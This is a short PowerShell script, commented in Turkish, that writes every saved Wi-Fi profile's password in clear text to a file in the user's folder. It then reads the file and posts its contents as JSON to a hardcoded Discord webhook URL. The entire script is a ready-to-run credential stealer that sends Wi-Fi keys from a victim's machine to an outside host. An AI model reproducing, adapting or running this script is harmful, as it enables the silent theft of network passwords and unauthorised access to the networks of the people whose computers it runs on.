# Wi-Fi profillerini dosyaya yaz
netsh wlan show profile name="*" key=clear > "$env:USERPROFILE\wifipass.txt"

# Discord Webhook URL'si
$webhookUrl = "https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN"

# Dosya içeriğini oku
$filePath = "$env:USERPROFILE\wifipass.txt"
$fileContent = Get-Content $filePath -Raw

# JSON özel karakterlerini düzgün kaçır
# - Çift tırnakları \"
# - Ters eğik çizgiyi \\
# - Satır sonlarını \n yap
$escapedContent = $fileContent -replace '\\','\\\\' -replace '"','\"' -replace "`r`n", "`n"

# JSON payload oluştur
$payload = @{ content = "```$escapedContent```" } | ConvertTo-Json -Compress

# Discord'a POST gönder
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
